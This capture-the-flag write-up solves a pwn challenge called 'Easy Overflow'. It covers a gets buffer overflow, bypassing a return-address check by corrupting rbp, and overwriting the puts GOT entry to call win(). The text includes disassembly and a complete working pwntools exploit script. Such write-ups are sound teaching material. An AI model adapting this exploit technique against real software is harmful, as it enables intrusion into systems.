# Easy Overflow

## Challenge

Author: Bob123

I did a check on my return address. Now you shouldn't be able to control my RIP.

nc fun.chall.seetf.sg 50003

[easy_overflow](easy_overflow)

## Solution

The binary has ``partial RELRO`` only.

```
[*] '/root/workspace/seetf/easy_overflow/easy_overflow'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The ``vuln`` function suffers from a buffer overflow due to a call to ``gets``.
Unfortunately the program then checks to ensure the return address hasn't been tampered with.

```
00401186  e8e5feffff         call    gets
0040118b  488d45e0           lea     rax, [rbp-0x20 {var_28}]
0040118f  4883c028           add     rax {__return_addr}, 0x28
00401193  488b00             mov     rax, qword [rax {__return_addr}]
00401196  488d152f000000     lea     rdx, [rel main]
0040119d  4883c246           add     rdx, 0x46
004011a1  4839d0             cmp     rax, rdx
004011a4  750e               jne     0x4011b4
```

This allows us to solely tamper with the ``rbp``, luckily for us, this is enough as further down, the binary executes the following code with the tampered ``rbp``

```
0040121e  488b154b2e0000     mov     rdx, qword [rel stdin]
00401225  488d45e0           lea     rax, [rbp-0x20 {var_28}]
00401229  be08000000         mov     esi, 0x8
0040122e  4889c7             mov     rdi, rax {var_28}
00401231  e82afeffff         call    fgets
```

So we'll redirect ``rbp`` to point to 0x20 bytes ahead of the global offset entry table for ``puts``, this will allow us to overwrite the populated address

```python3
pad = cyclic(32)
chain = p64(e.got['puts']+0x20) 
chain += p64(e.sym['main']+0x46)

p.recvuntil(b'I will let you  overflow me.')
p.sendline(pad+chain)
```

We'll then write the address of the ``win()`` function to the global offset table for ``put``, resulting in the binary calling win() here instead of puts()

```
00401236  488d45e0           lea     rax, [rbp-0x20 {var_28}]
0040123a  4889c7             mov     rdi, rax {var_28}
0040123d  e8eefdffff         call    puts
```

```python3

win = p64(e.sym['win'])

p.recvuntil(b'I will give you one more chance.')
p.sendline(win)
```

Putting it together, we have the following solution

```python
from pwn import *


binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x401231
break *0x40123d
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('fun.chall.seetf.sg',50003)
    else:
        return process(e.path)

p = start()

def pass_check():
   pad = cyclic(32)
   chain = p64(e.got['puts']+0x20) 
   chain += p64(e.sym['main']+0x46)

   p.recvuntil(b'I will let you  overflow me.')
   p.sendline(pad+chain)

def jmp_to_win():
   win = p64(e.sym['win'])

   p.recvuntil(b'I will give you one more chance.')
   p.sendline(win)

pass_check()
jmp_to_win()
p.interactive()

```
